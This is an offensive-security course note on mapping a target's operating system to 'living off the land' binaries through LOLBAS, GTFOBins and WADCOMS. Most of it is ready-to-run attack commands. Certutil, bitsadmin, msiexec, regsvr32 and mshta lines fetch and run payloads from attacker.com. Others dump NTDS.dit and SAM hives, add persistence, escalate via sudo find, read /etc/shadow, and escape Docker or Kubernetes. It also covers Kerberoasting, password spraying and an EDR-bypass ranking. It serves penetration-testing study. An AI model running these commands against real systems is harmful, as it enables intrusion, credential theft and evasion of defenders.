# Unintended Binary Research

**Roadmap:** Phase 2: Offensive Core → Part 4: Footprinting and Reconnaissance → Stage 4: Advanced Fingerprinting & Logic Analysis

# Section 1 — What it is and where it sits

Unintended binary research is the reconnaissance-phase task of mapping the target's operating system and installed software to their available Living off the Land (LotL) attack vectors — legitimate, pre-installed, vendor-signed binaries that can be repurposed for offensive operations. The mapping happens before exploitation and informs post-exploitation planning: which tools are available on the target without deploying custom malware, which actions can be performed using built-in OS functionality, and which LOL binaries evade EDR products that whitelist signed Windows/Linux binaries.

> [!IMPORTANT]
> **Scope boundary:** This note covers the recon-phase enumeration of LotL vectors from external intelligence — OS fingerprinting and mapping to available binaries. Execution techniques (how to weaponize specific binaries) are covered in Part 7, Phase 2 as stated in the roadmap.

```text
Stage 4 — Binary Research
────────────────────────────────────────────────────────────────────
OS Fingerprint  →  [Binary Mapping]  →  Post-Exploit Planning
Windows Server     ↑ YOU ARE HERE       certutil for download
2019 R2            LOLBAS / GTFOBins   msiexec for execution
Ubuntu 20.04       WADCOMS (AD)        python3 for reverse shell
                   map OS → vectors     without custom tools
────────────────────────────────────────────────────────────────────
```

---

# Section 2 — How attackers actually use this

## 2.1 OS fingerprinting to determine binary availability

The first step is confirming the OS and version from the recon data already collected. The OS determines which LOL binaries are available.

```bash
# From nmap OS detection
$ sudo nmap -O 203.0.113.45
Running: Microsoft Windows 2019
OS details: Microsoft Windows Server 2019

# From banner grabbing
$ nc 203.0.113.45 22
SSH-2.0-OpenSSH_for_Windows_8.9   ← Windows OpenSSH port

# From HTTP Server header
$ curl -sk -I https://corp-target.com/ | grep Server
Server: Microsoft-IIS/10.0   ← IIS = Windows Server 2016+

# From SMB
$ nmap --script smb-os-discovery -p 445 203.0.113.45
Host script results:
  smb-os-discovery:
    OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
    Computer name: WEB01
    Domain: corp.target.com

# Linux version from banner
$ nc 203.0.113.45 25
220 ubuntu-mail-01.corp.local ESMTP Postfix (Ubuntu)   ← Ubuntu

$ curl -sk https://corp-target.com/ -I | grep "X-Powered-By"
X-Powered-By: PHP/8.1.2-1ubuntu2.14   ← Ubuntu 22.04 (PHP version → distro map)
```

## 2.2 LOLBAS — Windows Living off the Land Binaries and Scripts

LOLBAS (lolbas-project.github.io) catalogs Windows binaries, scripts, and libraries that can be abused for attack purposes. Every entry specifies: execute, download, upload, credential access, persistence, or defense evasion capabilities.

**Core concept:** These binaries are pre-installed on Windows, signed by Microsoft, and often whitelisted by EDR products and application control policies (AppLocker, WDAC). Using them avoids deploying unsigned custom tools that trigger behavioral alerts.

**High-priority LOLBAS by category:**

```text
DOWNLOAD (pull tools/payloads without curl/wget):
  certutil.exe  -urlcache -f -split https://attacker.com/payload.exe payload.exe
  bitsadmin.exe /transfer job https://attacker.com/payload.exe C:\Temp\payload.exe
  Invoke-WebRequest (PowerShell — not a binary but built-in)
  msiexec.exe   /quiet /i https://attacker.com/malware.msi
  regsvr32.exe  /s /n /u /i:https://attacker.com/payload.sct scrobj.dll

EXECUTION (run without cmd.exe direct invocation):
  mshta.exe     https://attacker.com/payload.hta
  wscript.exe   payload.js / payload.vbs
  cscript.exe   payload.js
  rundll32.exe  payload.dll,EntryPoint
  regsvr32.exe  /s /n /u /i:https://attacker.com/payload.sct scrobj.dll
  msiexec.exe   /quiet /i payload.msi
  wmic.exe      process call create "cmd.exe /c whoami"

CREDENTIAL ACCESS:
  ntdsutil.exe  "ac i ntds" "ifm" "create full c:\temp" q q   ← NTDS.dit dump
  reg.exe       save HKLM\SYSTEM C:\Temp\SYSTEM              ← SAM/SYSTEM hive
  vssadmin.exe  create shadow /for=C:                         ← shadow copy for NTDS

PERSISTENCE:
  schtasks.exe  /create /sc minute /mo 5 /tn "Update" /tr payload.exe
  reg.exe       add HKCU\Software\Microsoft\Windows\CurrentVersion\Run

DEFENSE EVASION:
  certutil.exe  -encode payload.exe encoded.txt    ← base64 encode to bypass AV
  expand.exe    payload.cab payload.exe            ← extract from Cabinet archive
```

## 2.3 GTFOBins — Unix/Linux Living off the Land

GTFOBins (gtfobins.github.io) catalogs Unix binaries that can be exploited when found with SUID bit, sudo permissions, or when available in restricted environments.

**For recon-phase planning, the key question is:** given the OS version, which of these GTFOBins are almost certainly installed?

```text
Available on virtually all Linux distributions:
  awk, sed, grep, find, cat, head, tail, less, more
  python3 (most modern distros), perl, sh, bash, dash
  curl, wget (usually), nc/ncat (sometimes)
  tar, gzip, zip (usually)
  openssl (usually)
  env, xargs, tee, dd, cp, mv

Available on server/DevOps systems:
  docker (containers) — docker escape to host
  git, npm, pip (development tools)
  ansible, puppet, chef (configuration management)
  kubectl (Kubernetes) — escape to cluster

GTFOBins by attack category:
  Shell escape (restricted shell breakout):
    awk 'BEGIN {system("/bin/sh")}'
    python3 -c 'import os; os.system("/bin/sh")'
    find . -exec /bin/sh \; -quit
    
  Sudo privilege escalation (if user has sudo for specific binary):
    sudo find . -exec /bin/sh \; -quit
    sudo python3 -c 'import os; os.system("/bin/sh")'
    sudo awk 'BEGIN {system("/bin/sh")}'
    
  File read (read files without direct cat):
    openssl enc -in /etc/shadow
    awk '{print}' /etc/shadow
    
  File write (write to files):
    tee /etc/crontab <<< "* * * * * root /tmp/shell.sh"
    
  SUID abuse:
    find / -perm -4000 2>/dev/null   ← discover SUID binaries (active, post-access)
```

## 2.4 WADCOMS — Windows Active Directory command reference

WADCOMS (wadcoms.github.io) is a matrix of commands for Windows Active Directory environments organized by OS version, protocol, and attack category. For recon planning against a confirmed Active Directory target, WADCOMS maps which tools work against which AD configuration.

```text
Key WADCOMS categories and tools:

Domain User Enumeration (no creds):
  rpcclient -U "" -N <DC_IP> → enumdomusers
  ldapsearch -x -H ldap://<DC_IP> -b "dc=corp,dc=target"
  nmap --script msrpc-enum,smb-enum-users -p 445 <DC_IP>

Password Spraying (low-count auth to avoid lockout):
  crackmapexec smb <DC_IP> -u users.txt -p 'Winter2024!' --continue-on-success

Kerberoasting (TGS-REQ for service accounts — no DA needed):
  GetUserSPNs.py corp.target.com/jsmith:password123 -dc-ip <DC_IP> -request

AS-REP Roasting (no pre-auth required accounts):
  GetNPUsers.py corp.target.com/ -usersfile users.txt -dc-ip <DC_IP>

DCSync (requires Domain Admin or equivalent):
  secretsdump.py corp.target.com/Administrator:password@<DC_IP>

Lateral Movement:
  psexec.py, wmiexec.py, smbexec.py (Impacket)
  crackmapexec smb <target> -u admin -p password -x "whoami"
```

## 2.5 Mapping discovered OS/software to available LotL vectors

The practical output of binary research is a per-host LOL vector table:

```text
HOST: 203.0.113.45 — Windows Server 2019 (IIS 10.0, .NET 4.8)

LOLBAS availability (almost certain for Windows Server 2019):
  certutil.exe       ✅ Always present    → download/encode
  mshta.exe          ✅ Always present    → HTA execution
  wmic.exe           ✅ Always present    → remote WMI exec / process creation
  bitsadmin.exe      ✅ Always present    → background download
  msiexec.exe        ✅ Always present    → .msi execution/download
  regsvr32.exe       ✅ Always present    → scriptlet execution
  ntdsutil.exe       ✅ Domain Controller → AD database dump
  PowerShell         ✅ Always present    → all PowerShell-based attacks
  schtasks.exe       ✅ Always present    → persistence

EDR implications (CrowdStrike from note 02):
  certutil.exe       ⚠️  Monitored — most EDRs now alert on certutil download
  mshta.exe          🔴 High detection — AMSI covers HTA
  PowerShell -enc    ⚠️  Script block logging active in CrowdStrike
  regsvr32 scriptlet 🔴 High detection — well-known technique
  wmic.exe           ⚠️  Monitored for process create
  bitsadmin.exe      ✅  Lower detection rate than certutil

HOST: 203.0.113.50 — Ubuntu 20.04 LTS (nginx, Python 3.8)

GTFOBins availability (certain for Ubuntu 20.04):
  python3            ✅ Present → shell, download, port forward
  curl               ✅ Present → download files
  nc/ncat            ✅ Present → reverse shell
  awk, find, tar     ✅ Present → shell escape if restricted
  openssl            ✅ Present → file read, port forward
  docker             ? Check — if developer host, likely present → escape
```

## 2.6 LotL vector prioritization by EDR bypass probability

Not all LOL binaries have equal bypass probability against modern EDR. Mapping the defensive stack (note 02) to LOLBAS evasion effectiveness:

```text
EDR awareness by technique (2024 state):

Technique                   | CrowdStrike | SentinelOne | Defender ATP | Bypass Prob
────────────────────────────┼─────────────┼─────────────┼──────────────┼────────────
certutil download           | Detected    | Detected    | Detected     | Low
mshta HTA execution         | Detected    | Detected    | Detected     | Low
PowerShell -EncodedCommand  | Detected    | Detected    | Detected     | Low
regsvr32 scriptlet          | Detected    | Detected    | Detected     | Low
bitsadmin download          | Detected    | Partial     | Partial      | Medium
wmic process create         | Detected    | Detected    | Partial      | Low
msiexec URL execution       | Partial     | Partial     | Partial      | Medium-High
expand.exe extraction       | Partial     | Partial     | Low          | High
Inline C# compilation       | Detected    | Detected    | Partial      | Medium
Direct syscall (no LOLBAS)  | Partial     | Partial     | Partial      | High
```

## 2.7 Querying LOLBAS, GTFOBins, and WADCOMS from CLI

```bash
# Install lolcat (LOLBAS offline query) — not to be confused with the terminal tool
$ pip install lolcat
$ lolcat search certutil
$ lolcat list --category download

# GTFOBins via curl (no tool needed)
$ curl -s "https://gtfobins.github.io/gtfobins/python/" | python3 -c "
import sys, re
content = sys.stdin.read()
# Extract sudo section
sections = re.findall(r'<h2 id=\"([^\"]+)\".*?<div class=\"language-sh[^\"]*\">(.*?)</div>', content, re.DOTALL)
for name, code in sections[:5]:
    print(f'=== {name} ===')
    print(re.sub(r'<[^>]+>', '', code).strip())
"

# Offline GTFOBins reference (clone the repo)
$ git clone https://github.com/GTFOBins/GTFOBins.github.io /opt/gtfobins
$ grep -l "sudo" /opt/gtfobins/_gtfobins/*.md | xargs -I{} basename {} .md | sort

# WADCOMS query
$ curl -s "https://wadcoms.github.io/" | grep -A 3 "Kerberoast"
```

## 2.8 Container and cloud LOL binaries

Modern infrastructure introduces a new LOL binary surface: container runtimes, cloud CLI tools, and Kubernetes clients are frequently installed on DevOps and CI/CD hosts and carry their own set of privilege escalation and lateral movement vectors that traditional LOLBAS and GTFOBins do not cover.

```text
Container LOL vectors:
  docker (if user is in docker group or has sudo docker):
    docker run -v /:/mnt --rm alpine chroot /mnt sh   ← full host filesystem access
    docker run --privileged --pid=host -it alpine nsenter -t 1 -m -u -n -i sh   ← host namespace
  → Being in the docker group is equivalent to root on the host

  podman (rootless containers):
    podman run --rm -v /etc:/host/etc alpine cat /host/etc/shadow
    → Even rootless podman can read host files via bind mounts

Kubernetes LOL vectors (if kubectl is installed and configured):
  kubectl exec -it <pod> -- /bin/sh         ← interactive shell in pod
  kubectl cp <pod>:/etc/shadow /tmp/shadow  ← file exfil from pod
  kubectl get secrets -o yaml               ← dump all Kubernetes secrets
  kubectl create rolebinding --clusterrole=cluster-admin  ← privilege escalation
  → A service account with cluster-admin role = full cluster takeover

Cloud CLI LOL vectors:
  aws (AWS CLI — installed on EC2 instances and developer machines):
    aws iam list-users                      ← enumerate IAM users
    aws s3 ls s3://                         ← list all accessible S3 buckets
    aws secretsmanager list-secrets         ← list secrets
    aws ssm start-session --target <id>     ← shell via SSM without SSH
  
  az (Azure CLI):
    az account list                         ← list subscriptions
    az vm list-ip-addresses                 ← all VM IPs
    az keyvault secret list --vault-name X  ← list vault secrets
  
  gcloud (GCP):
    gcloud compute instances list           ← enumerate VMs
    gcloud secrets list                     ← list secrets
    gcloud projects list                    ← enumerate GCP projects
```

Recon-phase binary mapping for cloud/container targets:

```bash
# Check for container/cloud tools on discovered hosts (from banner/SNMP/RPC data)
# Shodan query: find hosts running Docker API exposed (common misconfiguration)
$ shodan search --fields ip_str "port:2375 product:docker"   ← unauthenticated Docker API!

# Port 2375 = Docker daemon without TLS
# If Docker API is exposed: curl http://<host>:2375/containers/json
# → Lists all running containers and can create privileged ones

# EC2 instance metadata service: check if host is on AWS
$ curl -sk http://169.254.169.254/latest/meta-data/  --connect-timeout 2
# If response comes back → this is an AWS EC2 instance
# → aws CLI + IMDS credentials available → enumerate IAM role

# GCP metadata service:
$ curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/"
# → GCP compute instance → gcloud service account token available

# Azure IMDS:
$ curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
# → Azure VM → Managed Identity token available
```

A Docker daemon exposed on port 2375 without TLS is a complete host compromise: you can create a privileged container with the host filesystem mounted and execute code as root on the host without any vulnerability exploitation.

---

# Section 3 — Core concepts and terminology

| Term | Definition |
|------|-----------|
| **LOLBAS** | Living off the Land Binaries and Scripts — Windows built-in executables abused for offensive operations |
| **GTFOBins** | Unix binaries that can break restricted shells, escalate privileges, or evade monitoring |
| **WADCOMS** | Windows Active Directory Commands matrix — organized by protocol, version, and attack category |
| **LotL (Living off the Land)** | Attack philosophy using pre-installed, vendor-signed tools to avoid detection |
| **certutil.exe** | Windows certificate management tool commonly abused for file download and base64 encoding |
| **mshta.exe** | Windows HTML Application host — executes HTA files; commonly abused for code execution |
| **SUID bit** | Unix permission bit allowing a binary to run as its owner (often root) regardless of caller UID |
| **AppLocker** | Windows application whitelisting policy — restricts which executables can run |
| **WDAC** | Windows Defender Application Control — successor to AppLocker with kernel-level enforcement |
| **AMSI** | Antimalware Scan Interface — Windows API allowing EDR to inspect scripts before execution |
| **Script block logging** | PowerShell logging feature recording all executed script content |
| **Kerberoasting** | Requesting TGS tickets for service accounts and cracking offline — no DA required |
| **AS-REP Roasting** | Targeting accounts with pre-authentication disabled — hash retrievable without credentials |
| **Impacket** | Python library providing implementations of Windows network protocols for offensive tooling |
| **Bypass probability** | Likelihood that a specific technique will not trigger EDR detection |

---

# Section 4 — Tools and commands

| Tool | URL/Command | What it covers | When to use |
|------|-------------|----------------|------------|
| LOLBAS Project | lolbas-project.github.io | Windows LOL binaries | OS = Windows |
| GTFOBins | gtfobins.github.io | Unix LOL binaries | OS = Linux/Unix |
| WADCOMS | wadcoms.github.io | AD attack commands | Target = Active Directory |
| `nmap -O` | `nmap -O <target>` | OS fingerprint | Before binary mapping |
| `smb-os-discovery` | `nmap --script smb-os-discovery -p 445` | Precise Windows version | Windows targets |

**Binary research workflow:**
```bash
# Step 1: Confirm OS versions
$ python3 - <<'EOF'
import xml.etree.ElementTree as ET
tree = ET.parse('version_scan.xml')
for host in tree.findall('.//host'):
    ip = host.find('.//address[@addrtype="ipv4"]').get('addr')
    os = host.find('.//osmatch')
    if os is not None:
        print(f"{ip} → {os.get('name')} (accuracy={os.get('accuracy')}%)")
EOF

# Step 2: Cross-reference with LOLBAS/GTFOBins
# Windows hosts → lolbas-project.github.io
# Linux hosts → gtfobins.github.io
# AD confirmed → wadcoms.github.io

# Step 3: Generate per-host binary table
$ cat > binary_map.md << 'EOF'
# LOL Binary Map

## Windows Hosts
| Host | OS | Top LOLBAS | EDR Bypass Prob |
|------|----|-----------|----------------|
| 203.0.113.45 | WS2019 | bitsadmin, msiexec | Medium |

## Linux Hosts
| Host | OS | Top GTFOBins | Restriction |
|------|----|------------|------------|
| 203.0.113.50 | Ubuntu 20.04 | python3, curl, awk | None detected |
EOF
```

---

# Section 5 — Defender detection

- **LOLBAS/GTFOBins website queries:** Entirely passive — browsing lolbas-project.github.io and gtfobins.github.io produces no target-facing traffic.
- **OS fingerprinting that reveals binary availability:** nmap OS detection (`-O`) sends TCP probes with specific TTL/window/options combinations — detectable as OS scan probes. Active SMB-based OS detection (`smb-os-discovery`) generates SMB traffic to port 445.
- **Execution of identified LOLBAS (post-access):** EDR detection rates for specific LOLBAS techniques are well-documented. Using certutil for download triggers CrowdStrike/SentinelOne behavioral rules immediately. Using bitsadmin has a lower (but not zero) detection rate. The binary research phase in recon is fully safe; the execution phase has variable detection rates by technique.

---

# Section 6 — Lab task

**Platform:** Kali Linux + Windows Server VM (lab) or TryHackMe "Windows Fundamentals" / "Weaponization" room.

**Objective:** Given an OS version, build a complete LOL binary availability map with EDR bypass probability assessment.

**Steps:**

1. **OS identification:** `sudo nmap -O <target>` — confirm OS version and accuracy
2. **SMB OS detail (Windows):** `nmap --script smb-os-discovery -p 445 <target>`
3. **Browse LOLBAS:** For Windows targets, visit `lolbas-project.github.io` — identify 5 download vectors, 5 execution vectors, and 2 credential access vectors
4. **Browse GTFOBins:** For Linux targets, identify 3 binaries with `sudo` abuse potential and 2 with SUID abuse potential
5. **WADCOMS matrix:** If AD confirmed, identify commands for: domain user enumeration, password spraying, Kerberoasting
6. **Build binary map table:** Per host: OS | Available LOL tools (top 5) | Category | EDR bypass probability
7. **Layer EDR bypass assessment:** Cross-reference binary map with identified EDR (from note 02) — mark each technique as High/Medium/Low bypass probability
8. **Identify highest-probability vectors:** Select the top 3 techniques for each OS with the highest EDR bypass probability — these are your Phase 3 post-exploitation starting points
9. **Document in `binary_map.md`:** Complete table per host with all identified vectors and bypass assessments

```bash
git commit -m "recon(stage4): binary research — LOL vector map for <target> OS inventory"
```

---

# Section 7 — Common mistakes

**1. Assuming all LOLBAS have equal EDR bypass rates**
_Why it matters:_ certutil download was a reliable bypass technique in 2018. In 2024 it is detected by virtually every commercial EDR. EDR vendors track LOLBAS abuse and add behavioral rules for each technique as it becomes popular.
_Fix:_ Always check current EDR bypass effectiveness using resources like `lolbas-project.github.io` (which notes detection status) and EDR vendor threat reports.

**2. Not checking for AppLocker/WDAC before planning LOLBAS use**
_Why it matters:_ AppLocker and WDAC can block specific LOL binaries entirely. If `mshta.exe` is blocked by AppLocker policy, planning a payload delivery via mshta fails.
_Fix:_ Post-access, always check AppLocker policy before using LOLBAS: `Get-AppLockerPolicy -Effective -Xml`.

**3. Conflating the GTFOBins SUID/sudo sections**
_Why it matters:_ GTFOBins has multiple sections per binary: shell, file write, file read, sudo, SUID, limited SUID. A technique listed under "sudo" requires the binary to be in the sudoers list for the current user. A technique listed under "SUID" requires the SUID bit to be set. These are different requirements.
_Fix:_ For each GTFOBins technique, confirm the prerequisite: does the current user have sudo for this binary? Is the SUID bit set? Check `sudo -l` and `find / -perm -4000` post-access.

**4. Mapping WADCOMS commands without confirming protocol availability**
_Why it matters:_ WADCOMS shows RPC-based commands that require port 135/445 to be accessible. If the firewall blocks these ports from your position, those commands are unavailable regardless of what the OS would support.
_Fix:_ Cross-reference the binary/command map with the port scan findings. Only include techniques where the required port is confirmed open.

---

# Section 8 — Move-on gate

1. You confirm the target is Windows Server 2019 with CrowdStrike Falcon detected. Without notes, name three LOLBAS download vectors, state which has the lowest CrowdStrike detection probability in 2024, and explain what makes it less detected than certutil.

2. A Linux target runs Ubuntu 20.04. `sudo -l` (post-access) shows: `User www-data may run the following commands: (root) NOPASSWD: /usr/bin/find`. Without notes, state the exact GTFOBins command that escalates privileges using this sudo rule and what it produces.

3. Explain the distinction between LOLBAS, GTFOBins, and WADCOMS — specifically: what OS each covers, what the primary use case is, and which one you use when a target is confirmed as a Windows Active Directory domain-joined machine.
